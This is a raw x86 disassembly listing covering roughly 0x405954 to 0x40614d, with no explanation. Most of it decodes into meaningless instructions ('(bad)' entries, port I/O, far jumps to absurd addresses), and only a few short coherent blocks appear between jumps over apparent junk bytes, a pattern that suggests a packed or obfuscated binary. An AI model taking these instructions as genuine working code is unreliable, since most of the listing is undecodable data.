  405954:	fld    DWORD PTR [edx-0x3758060]
  40595a:	popa   
  40595b:	jo     0x4058e2
  40595d:	repnz retf 
  40595f:	pushf  
  405960:	ror    DWORD PTR [edi+0x7e823703],1
  405966:	cwde   
  405967:	sbb    eax,0x948248d6
  40596c:	xchg   edi,eax
  40596d:	push   es
  40596e:	xchg   ebp,eax
  40596f:	xchg   DWORD PTR [ebx+0x5d],eax
  405972:	cmp    esp,edi
  405974:	cld    
  405975:	popa   
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	cli    
  4059b1:	mov    ebx,0x326a8bed
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x405a28
  4059bd:	retf   0xacb9
  4059c0:	push   cs
  4059c1:	push   ecx
  4059c2:	xor    BYTE PTR [ecx+esi*4-0x45],0x42
  4059c7:	or     DWORD PTR ds:0x2bf66af7,0x41f4e675
  4059d1:	sbb    BYTE PTR [edx],ch
  4059d3:	mov    ebx,ebx
  4059d5:	jbe    0x405986
  4059d7:	mov    bl,0x3c
  4059d9:	por    mm6,mm0
  4059dc:	sub    ecx,0x6f
  4059df:	fsub   QWORD PTR [ecx+0x4a]
  4059e2:	xlat   BYTE PTR ds:[ebx]
  4059e3:	loop   0x405a34
  4059e5:	xor    al,0xf1
  4059e7:	scas   eax,DWORD PTR es:[edi]
  4059e8:	fild   WORD PTR [ecx+0x49]
  4059eb:	add    bl,BYTE PTR [ecx+eax*8-0x40]
  4059ef:	fprem1 
  4059f1:	dec    ebx
  4059f2:	adc    eax,0x3136575e
  4059f7:	cmp    DWORD PTR [ebx+0x76],esi
  4059fa:	out    dx,al
  4059fb:	lock jo 0x4059f0
  4059fe:	jnp    0x4059f7
  405a00:	cmp    bl,BYTE PTR [esi]
  405a02:	sub    al,0xa7
  405a04:	xchg   ecx,eax
  405a05:	cli    
  405a06:	rcl    BYTE PTR [eax+ecx*4+0x63],1
  405a0a:	in     eax,dx
  405a0b:	or     ebx,DWORD PTR [ebx]
  405a0d:	adc    edx,DWORD PTR [esi]
  405a0f:	dec    esp
  405a10:	mov    ebx,0xb866c135
  405a15:	imul   ebp,DWORD PTR [ebx+eax*1+0x1a106914],0xffffffa6
  405a1d:	xchg   ebp,eax
  405a1e:	scas   eax,DWORD PTR es:[edi]
  405a1f:	push   esp
  405a20:	js     0x4059c2
  405a22:	jno    0x405a80
  405a24:	adc    eax,0xae1091c2
  405a29:	dec    eax
  405a2a:	jae    0x405a9f
  405a2c:	jo     0x4059bd
  405a2e:	(bad)  
  405a2f:	jmp    0xf2e247de
  405a34:	add    ecx,DWORD PTR [edx-0x44deb0be]
  405a3a:	jl     0x405a52
  405a3c:	add    ebp,DWORD PTR [edi-0x75]
  405a3f:	popa   
  405a40:	(bad)  
  405a41:	aad    0x8
  405a43:	hlt    
  405a44:	ins    BYTE PTR es:[edi],dx
  405a45:	sbb    ebp,DWORD PTR fs:[ecx]
  405a48:	dec    esi
  405a49:	rcl    BYTE PTR [ecx+0x73e14eb2],0x7a
  405a50:	and    eax,0x59d05a5c
  405a55:	push   0xffffff81
  405a57:	f2xm1  
  405a59:	push   ds
  405a5a:	fisttp QWORD PTR [esi+0x57a824f3]
  405a60:	jg     0x405a60
  405a62:	in     eax,0x95
  405a64:	sub    edx,edi
  405a66:	dec    eax
  405a67:	test   bl,bl
  405a69:	out    0x1b,eax
  405a6b:	or     bl,al
  405a6d:	pop    edx
  405a6e:	mov    ecx,0xe3d3c0a9
  405a73:	adc    edx,DWORD PTR [ecx+ebx*4]
  405a76:	add    DWORD PTR [ebx+0x75],edx
  405a79:	rcr    ch,cl
  405a7b:	jo     0x405ad3
  405a7d:	cmp    eax,0xe13bc918
  405a82:	test   eax,0x4dace220
  405a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a88:	out    0xa7,eax
  405a8a:	and    eax,0x208bccef
  405a8f:	hlt    
  405a90:	jne    0x405a5b
  405a92:	add    DWORD PTR [edx+eiz*4+0x0],edi
  405a96:	data16 shl BYTE PTR [edx+eiz*4+0x7690d35f],1
  405a9e:	xchg   ebx,eax
  405a9f:	xor    dh,dh
  405aa1:	popf   
  405aa2:	popf   
  405aa3:	dec    edi
  405aa4:	add    DWORD PTR [esp+ebp*8-0x2e],ebx
  405aa8:	call   0x12380300
  405aad:	clc    
  405aae:	jl     0x405ac6
  405ab0:	and    ah,BYTE PTR [edi]
  405ab2:	int    0x75
  405ab4:	ret    
  405ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ab6:	aad    0xa8
  405ab8:	xor    eax,0xd8c9a816
  405abd:	mov    bh,0x6b
  405abf:	push   edi
  405ac0:	aam    0xff
  405ac2:	pop    ss
  405ac3:	xchg   esi,eax
  405ac4:	movaps xmm7,xmm3
  405ac7:	and    eax,0x16ad3849
  405acc:	ffreep st(1)
  405ace:	sbb    al,al
  405ad0:	or     DWORD PTR [edi-0x34e66400],0xef970174
  405ada:	mov    dh,BYTE PTR ds:[eax+0x2806944]
  405ae1:	loopne 0x405a86
  405ae3:	push   esi
  405ae4:	jmp    0xa27a:0xe1309795
  405aeb:	pop    ecx
  405aec:	mov    esp,ebx
  405aee:	test   BYTE PTR [esi+edi*1],dl
  405af1:	mov    eax,ds:0x44a0b1de
  405af6:	fidivr DWORD PTR [esi+0x52]
  405af9:	daa    
  405afa:	aam    0xa9
  405afc:	outs   dx,BYTE PTR ds:[esi]
  405afd:	add    BYTE PTR [edi+eax*4+0x68],0xdf
  405b02:	xor    al,0x60
  405b04:	push   es
  405b05:	popa   
  405b06:	es inc ecx
  405b08:	mov    eax,0x13cf9a7a
  405b0d:	mov    BYTE PTR [edi+0x598b97c0],ch
  405b13:	aas    
  405b14:	popf   
  405b15:	cmp    ebx,DWORD PTR [ebx+0x1ccb8579]
  405b1b:	inc    edi
  405b1c:	(bad)  
  405b1d:	sub    ch,BYTE PTR [edi-0x1ea5bf68]
  405b23:	(bad)  
  405b24:	mov    eax,ds:0x967cb7da
  405b29:	and    al,0x78
  405b2b:	fwait
  405b2c:	xchg   esi,eax
  405b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b2e:	loopne 0x405ab2
  405b30:	sar    DWORD PTR [ebx-0x53380cc],0x1a
  405b37:	dec    edi
  405b38:	sub    al,0x19
  405b3a:	push   es
  405b3b:	(bad)  
  405b3c:	not    ah
  405b3e:	xchg   esp,eax
  405b3f:	sbb    DWORD PTR [ebp+0x51],esp
  405b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b43:	add    ebp,DWORD PTR [eax+0x36e1a2ce]
  405b49:	xor    BYTE PTR [ecx],ch
  405b4b:	or     esp,DWORD PTR [edi+0x62515d0c]
  405b51:	call   0x5d95:0x158dfd58
  405b58:	fwait
  405b59:	mov    bh,0xa
  405b5b:	fadd   st,st(2)
  405b5d:	xor    al,0xb3
  405b5f:	and    BYTE PTR [ebp+0x1f16379],dh
  405b65:	mov    ebx,0x7194ae00
  405b6a:	call   0xeb676954
  405b6f:	shl    DWORD PTR [ecx],cl
  405b71:	dec    edi
  405b72:	xchg   edi,eax
  405b73:	push   es
  405b74:	lock sbb bh,0x7d
  405b78:	or     ch,BYTE PTR [ebx+0x52]
  405b7b:	and    DWORD PTR [esi+ebx*4+0x48],ecx
  405b7f:	mov    eax,ds:0x9de1c3ee
  405b84:	inc    edx
  405b85:	in     eax,0xd0
  405b87:	cmc    
  405b88:	repz int 0xc
  405b8b:	outs   dx,BYTE PTR ds:[esi]
  405b8c:	adc    ebp,DWORD PTR [esi+0x63]
  405b8f:	or     edi,eax
  405b91:	push   cs
  405b92:	push   ecx
  405b93:	pop    ecx
  405b94:	std    
  405b95:	ins    BYTE PTR es:[edi],dx
  405b96:	ficomp DWORD PTR [esp+edi*1-0x26]
  405b9a:	push   ebx
  405b9b:	or     ecx,DWORD PTR [ebx+0x73edc417]
  405ba1:	xor    BYTE PTR [edx-0x68b6d237],al
  405ba7:	fsubr  DWORD PTR [ebx]
  405ba9:	daa    
  405baa:	inc    esi
  405bab:	jbe    0x405bc6
  405bad:	test   eax,0xcfc28e48
  405bb2:	enter  0x911c,0x88
  405bb6:	jmp    0xa7535a2b
  405bbb:	jbe    0x405b99
  405bbd:	add    dh,BYTE PTR [edi+0x563a9bf3]
  405bc3:	lods   eax,DWORD PTR ds:[esi]
  405bc4:	add    al,0x8
  405bc6:	xor    DWORD PTR [edx+0x6900eb37],esi
  405bcc:	es mov bh,0x5b
  405bcf:	neg    ch
  405bd1:	int3   
  405bd2:	int    0xc3
  405bd4:	mov    ecx,0x900f89fd
  405bd9:	fdiv   QWORD PTR [ebx+ecx*8-0x23]
  405bdd:	pusha  
  405bde:	call   0xd54d:0xb5f76b47
  405be5:	adc    DWORD PTR [edx+0xa66d0af],eax
  405beb:	adc    BYTE PTR ds:0x295b42ce,al
  405bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bf2:	push   edx
  405bf3:	arpl   WORD PTR [ebp-0x18],bp
  405bf6:	lahf   
  405bf7:	jg     0x405c5d
  405bf9:	test   BYTE PTR ds:0xead6da6a,0xa
  405c00:	jno    0x405be9
  405c02:	add    al,0x4
  405c04:	bnd js 0x405c64
  405c07:	pop    ds
  405c08:	je     0x405bbe
  405c0a:	mov    cl,0x15
  405c0c:	inc    ecx
  405c0d:	cmp    eax,0x1ded1e09
  405c12:	cmp    edx,DWORD PTR [edi-0x37]
  405c15:	push   0xe9d86405
  405c1a:	cmp    al,0xda
  405c1c:	push   ds
  405c1d:	sub    BYTE PTR [eax],0x6a
  405c20:	(bad)  
  405c21:	icebp  
  405c22:	imul   ecx,ecx,0xffffff91
  405c25:	fild   WORD PTR [edi]
  405c27:	dec    BYTE PTR [edi+0x4858771a]
  405c2d:	jae    0x405c64
  405c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c30:	jno    0x405c09
  405c32:	loop   0x405c0c
  405c34:	sbb    al,0x91
  405c36:	dec    ecx
  405c37:	or     eax,0x5e1ba2cc
  405c3c:	xchg   ebx,eax
  405c3d:	ret    0x72a3
  405c40:	mov    ecx,?
  405c42:	add    eax,0xacc16eb7
  405c47:	imul   esi,DWORD PTR [esi+eiz*2-0x68],0x51
  405c4c:	mov    dh,0xc3
  405c4e:	add    eax,0xcebfacfa
  405c53:	xchg   ebp,eax
  405c54:	sbb    BYTE PTR [edi+edi*2-0x2ed24c12],dh
  405c5b:	call   0x5ef1:0xa63400ac
  405c62:	mov    esp,0x9f324805
  405c67:	or     ebp,esi
  405c69:	jecxz  0x405c5f
  405c6b:	xor    BYTE PTR [ebx],bl
  405c6d:	mov    ebp,esp
  405c6f:	mov    ch,0x9f
  405c71:	pop    es
  405c72:	mov    al,0x37
  405c74:	fbld   TBYTE PTR [ebx]
  405c76:	call   0x1200:0x1ebd218b
  405c7d:	mov    cs,WORD PTR [edi+edi*4-0x7252fe9d]
  405c84:	or     ax,0xaf0a
  405c88:	dec    ebp
  405c89:	add    eax,0x2efc7b2
  405c8e:	mov    al,ds:0x6997ff3b
  405c93:	je     0x405c62
  405c95:	int    0x76
  405c97:	ror    ecx,cl
  405c99:	inc    ecx
  405c9a:	rol    ebx,cl
  405c9c:	shl    DWORD PTR [edi],cl
  405c9e:	mov    ecx,0x23a56338
  405ca3:	ins    DWORD PTR es:[edi],dx
  405ca4:	imul   eax,DWORD PTR [edi-0x59e0c24c],0x39
  405cab:	sbb    al,0xf3
  405cad:	dec    ebx
  405cae:	jo     0x405d17
  405cb0:	test   al,0x83
  405cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb3:	cmovne ebx,DWORD PTR [eax-0x46]
  405cb7:	push   esi
  405cb9:	fs repnz popf 
  405cbc:	bound  ecx,QWORD PTR [esi]
  405cbe:	cmp    eax,0xb60829f8
  405cc3:	xchg   ebx,eax
  405cc4:	xor    DWORD PTR [ebp-0x59],edx
  405cc7:	cli    
  405cc8:	test   DWORD PTR [esi+0x3d386b63],esi
  405cce:	sbb    al,0x51
  405cd0:	into   
  405cd1:	add    esp,DWORD PTR [edi-0x30af891e]
  405cd7:	por    mm4,QWORD PTR [ebx+0x76ffca1a]
  405cde:	dec    ebx
  405cdf:	dec    ecx
  405ce0:	fdiv   QWORD PTR [edx+0x6816886a]
  405ce6:	add    al,BYTE PTR [ecx-0x3e]
  405ce9:	rcl    DWORD PTR ds:0x2023696a,1
  405cef:	jecxz  0x405d64
  405cf1:	bnd jno 0x405cf9
  405cf4:	rcl    ah,cl
  405cf6:	cmp    DWORD PTR [ebx-0x12],esp
  405cf9:	mov    edx,DWORD PTR [ebp-0x34]
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	pushf  
  405d2c:	popa   
  405d2d:	retf   0x2ffa
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d13
  405d38:	loop   0x405d50
  405d3a:	mov    DWORD PTR [edx+0x39141af2],0x869cd5ba
  405d44:	xchg   esi,eax
  405d45:	or     BYTE PTR [ebx],dl
  405d47:	dec    eax
  405d48:	mov    ds:0xf93de8ee,eax
  405d4d:	sub    eax,DWORD PTR [edx+esi*8]
  405d50:	scas   eax,DWORD PTR es:[edi]
  405d51:	cmp    cl,BYTE PTR [edi]
  405d53:	and    al,BYTE PTR [esi+0x2d824f27]
  405d59:	adc    ecx,DWORD PTR [esp+ebp*2]
  405d5c:	xor    al,0x65
  405d5e:	push   0xfffffffd
  405d60:	or     DWORD PTR [edx],0xffffffce
  405d63:	bound  esi,QWORD PTR [ecx]
  405d65:	push   0x7e
  405d67:	push   0x44
  405d69:	cli    
  405d6a:	jg     0x405d8e
  405d6c:	(bad)  
  405d6e:	imul   eax,DWORD PTR [esi+0x77508223],0xde2ca726
  405d78:	add    eax,0x9993ed98
  405d7d:	inc    eax
  405d7e:	fwait
  405d7f:	mov    bl,dh
  405d81:	ret    
  405d82:	shl    DWORD PTR [eax],0x29
  405d85:	sbb    dl,BYTE PTR [ebx+edx*8]
  405d88:	adc    al,0xd0
  405d8a:	pop    eax
  405d8b:	adc    bl,BYTE PTR [ebx+0x54af5d6e]
  405d91:	sbb    al,0x49
  405d93:	mov    ds:0x22a7b179,al
  405d98:	sbb    al,0x31
  405d9a:	das    
  405d9b:	jne    0x405d3e
  405d9d:	mov    edx,0x6643a502
  405da2:	stos   DWORD PTR es:[edi],eax
  405da3:	xchg   ebx,eax
  405da4:	iret   
  405da5:	sub    al,0xb5
  405da7:	push   ecx
  405da8:	push   es
  405da9:	iret   
  405daa:	mov    ebp,0xfeb698ab
  405daf:	mov    al,ds:0xbe9cd8d8
  405db4:	fwait
  405db5:	sbb    al,0x36
  405db7:	in     eax,0xa5
  405db9:	scas   al,BYTE PTR es:[edi]
  405dba:	jbe    0x405db5
  405dbc:	push   eax
  405dbd:	jg     0x405dc2
  405dbf:	lea    eax,[ebp+edx*4+0x4a]
  405dc3:	iret   
  405dc4:	cli    
  405dc5:	jae    0x405e45
  405dc7:	ds jnp 0x405db9
  405dca:	pusha  
  405dcb:	xor    eax,0x8cab89
  405dd0:	mov    bl,0x34
  405dd2:	stos   DWORD PTR es:[edi],eax
  405dd3:	std    
  405dd4:	daa    
  405dd5:	je     0x405dc6
  405dd7:	inc    eax
  405dd8:	xchg   esp,eax
  405dd9:	out    dx,al
  405dda:	push   ecx
  405ddb:	(bad)  
  405ddc:	sbb    al,0x7f
  405dde:	data16 mov ah,0x25
  405de1:	lods   al,BYTE PTR ds:[esi]
  405de2:	inc    edx
  405de3:	jmp    0x4d23:0xd5ea3af6
  405dea:	sub    al,0xed
  405dec:	lahf   
  405ded:	out    dx,al
  405dee:	repnz out 0x8c,al
  405df1:	rol    BYTE PTR [eax+edx*1-0x2a],0xa3
  405df6:	in     al,dx
  405df7:	pop    edx
  405df8:	xchg   edx,eax
  405df9:	test   DWORD PTR [ebx+0xf],esi
  405dfc:	jg     0x405dc1
  405dfe:	fadd   QWORD PTR [esi-0x3596083b]
  405e04:	push   ebx
  405e05:	dec    edi
  405e06:	imul   esp,DWORD PTR [edx],0x3e
  405e09:	pop    ds
  405e0a:	and    eax,0x9d21ebf4
  405e0f:	into   
  405e10:	add    esi,eax
  405e12:	push   eax
  405e13:	sub    dh,cl
  405e15:	(bad)  
  405e16:	adc    al,0x42
  405e18:	xlat   BYTE PTR ds:[ebx]
  405e19:	mov    ebx,0x4bfb5e57
  405e1e:	inc    ebp
  405e1f:	jno    0x405e43
  405e21:	add    BYTE PTR [eax+0x4b],cl
  405e24:	repnz arpl WORD PTR [eax+edx*4-0x6e],dx
  405e29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e2a:	test   DWORD PTR [ebp-0x23],esi
  405e2d:	lahf   
  405e2e:	(bad)  
  405e30:	mov    dl,0xf5
  405e32:	imul   edx,DWORD PTR [eax],0x62
  405e35:	push   eax
  405e36:	imul   esp,ebx,0x120d64f0
  405e3c:	mov    ebx,0xd7340070
  405e41:	inc    ebp
  405e42:	pop    ecx
  405e43:	mov    WORD PTR [edi+0x73],gs
  405e46:	cmp    BYTE PTR [edi-0x35],ah
  405e49:	data16 loopne 0x405ec7
  405e4c:	mov    ds:0x4986e661,eax
  405e51:	add    ecx,DWORD PTR [ebx]
  405e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e54:	cdq    
  405e55:	pop    eax
  405e56:	pop    ecx
  405e57:	retf   0x10bf
  405e5a:	jmp    0x405e5f
  405e5c:	add    eax,0x48609d33
  405e61:	jecxz  0x405def
  405e63:	mov    esi,0x4e156819
  405e68:	retf   
  405e69:	jg     0x405e65
  405e6b:	add    eax,DWORD PTR [edx+0x13]
  405e6e:	lea    ebp,ds:0xac419b5c
  405e74:	xchg   BYTE PTR ss:[esi+edx*2+0x14889f0b],ch
  405e7c:	add    DWORD PTR [eax-0x5e96cc5a],0x40e6e705
  405e86:	icebp  
  405e87:	pop    ebx
  405e88:	or     BYTE PTR [ebx+ebp*1+0x2c],bl
  405e8c:	stos   BYTE PTR es:[edi],al
  405e8d:	clflush BYTE PTR [ebx-0x7c]
  405e91:	sbb    edx,DWORD PTR [ebx]
  405e93:	jb     0x405e40
  405e95:	xchg   ebp,eax
  405e96:	pop    ss
  405e97:	cmc    
  405e98:	or     BYTE PTR [ecx-0x3],ah
  405e9b:	cmp    eax,0x1d0dba83
  405ea0:	mov    bl,dh
  405ea2:	cs repnz mov ah,0x11
  405ea6:	popa   
  405ea7:	fisubr DWORD PTR [edx]
  405ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eaa:	shl    BYTE PTR [eax+0x1f],0xab
  405eae:	mov    ebx,0x502ee28f
  405eb3:	mov    bh,0x4b
  405eb5:	inc    esi
  405eb6:	pop    ebx
  405eb7:	dec    edi
  405eb8:	pusha  
  405eb9:	dec    eax
  405eba:	(bad)  [esi-0x6edca48f]
  405ec0:	push   ebp
  405ec1:	mov    ebx,0x40c235f8
  405ec6:	adc    DWORD PTR [edx],0xeed4efb
  405ecc:	call   0xb6e8:0xe0020d40
  405ed3:	fiadd  DWORD PTR [edi]
  405ed5:	ss bound eax,QWORD PTR es:[ebx]
  405ed9:	daa    
  405eda:	xchg   ebx,eax
  405edb:	adc    BYTE PTR ds:0xc3a4de8f,cl
  405ee1:	pop    eax
  405ee2:	stc    
  405ee3:	xchg   ebx,eax
  405ee4:	mov    ebp,0x54dd13ed
  405eea:	test   al,0xab
  405eec:	out    0x35,al
  405eee:	nop
  405eef:	or     eax,0x743620da
  405ef4:	jmp    0xae54d8c6
  405ef9:	sbb    al,0x2d
  405efb:	xchg   ecx,eax
  405efc:	xor    eax,0xd059c265
  405f01:	sub    al,0x9c
  405f03:	clc    
  405f04:	hlt    
  405f05:	adc    eax,0x6459025f
  405f0a:	jmp    0x5b928a9
  405f0f:	ss clc 
  405f11:	rol    al,1
  405f13:	nop
  405f14:	push   DWORD PTR ds:0x3c5b58f4
  405f1a:	jecxz  0x405eb5
  405f1c:	loopne 0x405f63
  405f1e:	pop    ds
  405f1f:	sub    BYTE PTR [eax+0x75],0xee
  405f23:	test   al,0x1d
  405f25:	mov    esp,DWORD PTR [edx-0x20]
  405f28:	cmc    
  405f29:	adc    ecx,edx
  405f2b:	push   0x86677525
  405f30:	ins    BYTE PTR es:[edi],dx
  405f31:	add    al,0xc7
  405f33:	fmul   DWORD PTR [ebp+0x24]
  405f36:	jnp    0x405ec4
  405f38:	sbb    bh,BYTE PTR [ebp+0xc]
  405f3b:	test   al,0xa1
  405f3d:	call   0xf66495b4
  405f42:	dec    ecx
  405f43:	push   edx
  405f44:	mov    bl,0xfa
  405f46:	adc    DWORD PTR [edi-0x506b43e3],eax
  405f4c:	outs   dx,BYTE PTR ds:[esi]
  405f4d:	scas   eax,DWORD PTR es:[edi]
  405f4e:	stc    
  405f4f:	pop    esp
  405f50:	call   0xb8ee2886
  405f55:	xchg   edx,eax
  405f56:	aaa    
  405f57:	xor    DWORD PTR [ebx],ebx
  405f59:	jbe    0x405fb4
  405f5b:	mov    bh,ah
  405f5d:	lahf   
  405f5e:	add    eax,0x6aa882b4
  405f63:	iret   
  405f64:	outs   dx,DWORD PTR ds:[esi]
  405f65:	bound  ebx,QWORD PTR [esi]
  405f67:	pop    edx
  405f68:	sbb    al,0x27
  405f6a:	imul   eax,DWORD PTR [ebx+0x74]
  405f6e:	arpl   sp,bp
  405f70:	xor    ecx,ebx
  405f72:	mov    cl,0xd0
  405f74:	scas   al,BYTE PTR es:[edi]
  405f75:	cli    
  405f76:	jg     0x405f93
  405f78:	mov    WORD PTR [eax+edi*4],ds
  405f7b:	stos   BYTE PTR es:[edi],al
  405f7c:	loop   0x405f85
  405f7e:	mov    BYTE PTR [edx-0x760070df],dl
  405f84:	fisubr WORD PTR [eax+0x6f75a64]
  405f8a:	adc    DWORD PTR [ebp-0x2f],eax
  405f8d:	push   es
  405f8e:	mov    edi,0x8c048fc8
  405f93:	sbb    DWORD PTR [esi],0xffffffbf
  405f96:	addr16 loop 0x405fc2
  405f99:	icebp  
  405f9a:	sar    BYTE PTR [ebx],cl
  405f9c:	retf   0x2f85
  405f9f:	adc    BYTE PTR [ebx-0x54],ah
  405fa2:	inc    edx
  405fa3:	rol    BYTE PTR [ebx+0x3d],1
  405fa6:	test   BYTE PTR [eax+0x10],0xf
  405faa:	dec    esi
  405fab:	arpl   sp,cx
  405fad:	pop    edx
  405fae:	dec    esi
  405faf:	jae    0x405fb3
  405fb1:	cs adc eax,0x2612f5a0
  405fb7:	lods   eax,DWORD PTR ds:[esi]
  405fb8:	pop    ebp
  405fb9:	sub    eax,0xd375ad2d
  405fbe:	bnd jge 0x405f87
  405fc1:	sbb    DWORD PTR [edi],esi
  405fc3:	lea    ebx,[edx+0x3bb1efdf]
  405fc9:	jle    0x405faa
  405fcb:	out    0x69,eax
  405fcd:	ror    esi,cl
  405fcf:	add    DWORD PTR [esi-0x75acdce8],ebx
  405fd5:	(bad)  
  405fd6:	xor    dl,BYTE PTR [esi+0x1b8cea9f]
  405fdc:	in     al,0x11
  405fde:	mov    WORD PTR [ebp+0x3],gs
  405fe1:	imul   eax,DWORD PTR [eax],0xa622d89a
  405fe7:	jp     0x405fe7
  405fe9:	sti    
  405fea:	rcr    ecx,1
  405fec:	jl     0x40603b
  405fee:	pop    esp
  405fef:	lea    ebp,[ebx+0x6]
  405ff2:	cmp    dl,dh
  405ff4:	or     al,0x34
  405ff6:	mov    ebp,ecx
  405ff8:	mov    edi,0x9587d32c
  405ffd:	add    ch,bl
  405fff:	or     eax,0xae08255c
  406004:	mov    ds:0x87c9a816,eax
  406009:	sbb    ebp,edx
  40600b:	sbb    BYTE PTR [ecx-0x37],ch
  40600e:	iret   
  40600f:	loope  0x40605f
  406011:	adc    eax,DWORD PTR [ebx-0x7c0816ad]
  406017:	mov    ss,WORD PTR [ecx+ecx*2+0x6b]
  40601b:	sbb    ax,0x88f5
  40601f:	call   0xa93a1220
  406024:	mov    BYTE PTR [ebx-0x66],bl
  406027:	inc    ecx
  406028:	femms  
  40602a:	add    BYTE PTR [ebx-0x769e39bf],al
  406030:	push   ss
  406031:	gs ins BYTE PTR es:[edi],dx
  406033:	cli    
  406034:	cmp    DWORD PTR [esi-0x5a245147],0xffffffcd
  40603b:	adc    BYTE PTR [ecx+0x71],dl
  40603e:	les    esp,FWORD PTR ds:0xde9b9d36
  406044:	or     eax,0x5b7f0068
  406049:	(bad)  
  40604a:	push   cs
  40604b:	loopne 0x4060c7
  40604d:	pop    ds
  40604e:	in     eax,dx
  40604f:	push   eax
  406050:	das    
  406051:	(bad)  
  406052:	push   cs
  406053:	add    eax,DWORD PTR [ebx+0x1f]
  406056:	fld    QWORD PTR [ebx-0x6ac893a]
  40605c:	mov    edi,0xbb615fdd
  406061:	xor    al,0x9d
  406063:	popf   
  406064:	mov    al,0x5f
  406066:	adc    DWORD PTR [ebp+edi*2-0x4fb18abe],edx
  40606d:	jp     0x406056
  40606f:	pop    edx
  406070:	shr    DWORD PTR [eax-0x25c46d24],cl
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xda
  40608b:	inc    ebp
  40608d:	daa    
  40608e:	loopne 0x4060cd
  406090:	jle    0x406110
  406092:	xor    edi,DWORD PTR [ebp+0x7e]
  406095:	jle    0x406105
  406097:	cs jnp 0x406108
  40609a:	scas   eax,DWORD PTR es:[edi]
  40609b:	daa    
  40609c:	sbb    ah,BYTE PTR [edx]
  40609e:	mov    ecx,0xc5e67920
  4060a3:	loop   0x406082
  4060a5:	ja     0x406085
  4060a7:	xchg   ecx,eax
  4060a8:	aam    0xd5
  4060aa:	jl     0x40610b
  4060ac:	cdq    
  4060ad:	push   0xac97c146
  4060b2:	call   0x5d7d:0xb18e8228
  4060b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ba:	js     0x406082
  4060bc:	mov    dl,0xe2
  4060be:	mov    edi,DWORD PTR [esi+0x4f]
  4060c1:	mov    WORD PTR [ecx],es
  4060c3:	adc    eax,0xc645ed2e
  4060c8:	jmp    0x821:0xacbea2a6
  4060cf:	adc    dl,dh
  4060d1:	push   esi
  4060d3:	xlat   BYTE PTR ds:[ebx]
  4060d4:	idiv   DWORD PTR [esi-0x23ad2924]
  4060da:	retf   
  4060db:	pushf  
  4060dc:	xor    DWORD PTR [eax+0x51],edi
  4060df:	dec    ebx
  4060e0:	jo     0x406124
  4060e2:	call   DWORD PTR [ebp+0x55829cd5]
  4060e8:	mov    dl,0xe6
  4060ea:	scas   eax,DWORD PTR es:[edi]
  4060eb:	in     eax,0xad
  4060ed:	mov    cl,ch
  4060ef:	dec    esi
  4060f0:	rcr    esp,1
  4060f2:	dec    ebp
  4060f3:	pop    ebp
  4060f4:	lods   eax,DWORD PTR ds:[esi]
  4060f5:	fs popa 
  4060f7:	xor    ah,BYTE PTR [esp+eiz*8-0x8]
  4060fb:	es dec ebx
  4060fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ff:	xor    edx,edx
  406101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406102:	sub    al,0x86
  406104:	or     DWORD PTR [edi*2+0x2e29c36a],edi
  40610b:	fdiv   QWORD PTR [edx+0x242cead4]
  406111:	ret    
  406112:	sbb    eax,0xf95191ce
  406117:	push   edx
  406118:	push   ds
  406119:	cmp    eax,0xa53daa1b
  40611e:	clc    
  40611f:	imul   ecx,DWORD PTR [ebp+ebx*8-0x14],0xffffffae
  406124:	aaa    
  406125:	dec    ebx
  406126:	or     al,0x64
  406128:	loope  0x4060af
  40612a:	test   al,0x61
  40612c:	out    dx,al
  40612d:	cmp    DWORD PTR [ecx+ebp*2-0x3f3bf969],ebp
  406134:	fs dec eax
  406136:	jmp    0x40612c
  406138:	adc    DWORD PTR [edx-0x4568977],edx
  40613e:	xor    eax,ecx
  406140:	imul   esp,DWORD PTR [ebp+ebp*8-0x3d6d4640],0x60
  406148:	push   0xfeeb57d8
  40614d:	xor    esp,ebx
